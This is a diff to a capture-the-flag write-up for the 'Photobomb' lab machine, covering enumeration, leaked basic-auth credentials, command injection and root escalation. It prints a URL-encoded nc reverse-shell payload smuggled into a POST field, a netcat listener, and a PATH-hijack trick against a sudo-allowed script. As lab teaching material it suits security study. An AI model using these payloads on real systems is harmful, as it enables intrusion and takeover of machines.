@@ -15,14 +15,21 @@ tags:
   - ctfs
 date: 2022-12-12T06:30:49.237Z
 ---
+
 ## Introduction
 
-This machine is an easy machine that demonstrates how you can easily exploit a
-basic HTTP Authentication.
+Introducing this user-friendly machine that showcases the simplicity of exploiting basic HTTP Authentication. With a straightforward setup and intuitive interface, this machine provides a hands-on demonstration of how easily one can exploit this type of authentication.
 
 ## Enumeration
 
-After the usual nmap scan we have the following results.
+We run our usual nmap scan with the flags `-sC`, `-sV`
+
+```shell
+nmap -sC -sV -v -oA 10.10.11.182-full.txt 10.10.11.182
+```
+
+- `-sV` We probe for open ports to determine services/version info.
+- `-sC` Scan for available scripts to our vulnerabilities.
 
 ```shell
 # Nmap 7.93 scan initiated Wed Dec  7 19:50:38 2022 as: nmap -sC -sV -v -oA 10.10.11.182-full.txt 10.10.11.182
@@ -48,24 +55,28 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Dec  7 19:50:53 2022 -- 1 IP address (1 host up) scanned in 14.63 seconds
 ```
 
-2 posts open :
+2 ports open are found :
 
 - 22 (ssh)
 - 80 (http) [photobomb.htb](http://photobomb.htb/)
 
-As usual we add the domain to our **/etc/hosts** file. Since we know port 80 is
-open, we do an enumeration for a list of directories.
+From now on since we can't access our IP on our web browser. As usual we add the
+domain to our **/etc/hosts** file. Since we know port 80 is open, we do an
+enumeration for a list of directories.
+
+### Directories Enumeration
+
+`gobuster` is the right tool for directory discovery, but you can use other tools like `dirbuster`
 
 ```shell
 gobuster dir -w wordlist.txt -u http://photobomb.htb/ -x php,txt,html
 ```
 
-We find a url [http://photobomb.htb/printer](http://photobomb.htb/printer) that
-takes us to a login session.
+We find a url pointing to this path [http://photobomb.htb/printer](http://photobomb.htb/printer) that takes us to a login session.
 
 The login session is a Basic HTTP Authentication. After checking the page source
-code we find something interesting in there. we find this file
-[photobomb.js](http://photobomb.htb/photobomb.js)
+code we find something interesting in there. We find in this file
+[photobomb.js](http://photobomb.htb/photobomb.js) what it seems to be credentials for our session.
 
 ```javascript
 function init() {
@@ -81,26 +92,38 @@ function init() {
 window.onload = init;
 ```
 
-This javascript file contains the credentials to the session, as it says in the
-commented line.
+The comment in the file says it all. apparently tech support keep forgetting
+the password, let's figure out how to exploit this.
 
 ## Exploitation
 
-This is an easy one to exploit since we can encode in the URL a reverse shell
-that gives us the access to the machine.
+This is an easy one to exploit. We use a vulnerability scanner like `Burp Suite` to find the possibility to encode a reverse shell in the POST request.
+We can encode this reverse shell in the URL.
 
 ```shell
  curl -X POST -u pH0t0:b0Mb! "http://photobomb.htb/printer" -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.78%201234%20%3E%2Ftmp%2Ff&dimensions=3000x2000"
 ```
 
-You have a shell. So after getting the user flag it's easy to elevate your
+By using `netcat` and listen on a specific port
+
+```shell
+nc -lnp 1234
+```
+
+- `-l` Listen for an incoming connection.
+- `-n` Do not resolve domain names.
+- `-p` Use specified port.
+
+and with this, it gives us the access to the machine.
+
+Now, we have a shell. So after getting the user flag let's try to elevate our
 priviledges.
 
 ```shell
  sudo -l
 ```
 
-gives this result
+This will list all the commands that the user can execute on the current machine.
 
 ```shell
 Matching Defaults entries for wizard on photobomb:
@@ -115,6 +138,8 @@ User wizard may run the following commands on photobomb:
 
 It means we can execute **/opt/cleanup.sh** with some environment variables as
 root.
+
+This is the content of the cleanup file.
 
 ```shell
 #!/bin/bash
@@ -133,11 +158,13 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 
 ```
 
-Create a file that contains the following.
+Create a file named `find` with these two commands.
 
 ```shell
- echo '/bin/bash -i'>find
- chmod +x find
+# First command is to create the file with a bash interactive session
+echo '/bin/bash -i'>find
+# Make it executable
+chmod +x find
 ```
 
 Run this command now.
@@ -146,5 +173,7 @@ Run this command now.
  sudo PATH=$PWD:$PATH /opt/cleanup.sh
 ```
 
-You're root, now you know the drill.
+`$PWD` is added to the `$PATH` environment variable in order to execute our
+created file before the one installed in the linux machine.
 
+You're root, now you know the drill.
